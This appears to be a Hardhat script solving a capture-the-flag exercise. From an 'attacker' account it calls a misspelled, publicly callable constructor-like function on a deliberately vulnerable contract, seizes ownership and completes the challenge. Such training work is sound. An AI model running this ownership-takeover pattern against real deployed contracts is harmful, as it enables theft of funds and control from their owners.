const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("AssumeOwnershipChallenge", deployer);
  const mainContract = await MainContract.deploy();

  await mainContract.connect(attacker).AssumeOwmershipChallenge();
  await mainContract.connect(attacker).authenticate();
  console.log("Is completed: ", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
